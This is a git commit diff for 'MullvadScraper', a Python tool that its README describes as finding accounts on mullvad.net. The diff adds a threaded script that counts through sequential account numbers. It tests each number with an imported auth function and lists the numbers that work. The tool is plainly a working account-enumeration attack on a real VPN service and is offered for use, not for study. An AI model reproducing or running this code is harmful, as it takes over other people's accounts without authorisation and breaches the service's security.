922e4c99c52048b342b4d8240355acc079a0ff82
Dicks majte <ib@cock.li>
2016-11-20 21:37:51 +0100

    Fixed stuff

--- README.md
+++ README.md
@@ -1,3 +1,9 @@
 # MullvadScraper
 Scraper made in python to find accounts on mullvad.net.
 The auth method can also be used for other csrf protected websites.
+
+##ToDo
+- [X] Threading
+- [ ] Click progressbar
+- [ ] Exception handling
+- [ ] Keyboard interrupt to close
--- mullvad.py
+++ mullvad.py
@@ -1,4 +1,41 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+import requests, time, os, sys
+from Queue import Queue
 from authModule import auth
-print auth('666')
+import threading
+import click
+
+queue = Queue()
+working = []
+print_lock = threading.Lock()
+
+@click.command()
+@click.option('--threads', default=1, help='Number of threads.')
+@click.option('--accounts', default=5, help='Number of accounts.')
+@click.option('--start', default=0)
+def main(accounts, threads, start):
+	starttime = time.time()
+	for x in range(accounts):
+		queue.put(start+x)
+
+	for i in range(threads):
+		worker = threading.Thread(target=Worker, args=(queue,))
+		worker.setDaemon(True)
+		worker.start()
+
+	queue.join()
+	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')
+
+def DoWork(account):
+	if auth(account):
+		with print_lock:
+			click.secho('The account %s is working!' % account, fg='green')
+			working.append(account)
+
+def Worker(q):
+	while True:
+		account = q.get()
+		DoWork(account)
+		q.task_done()
+
+if __name__ == '__main__':
+	main()
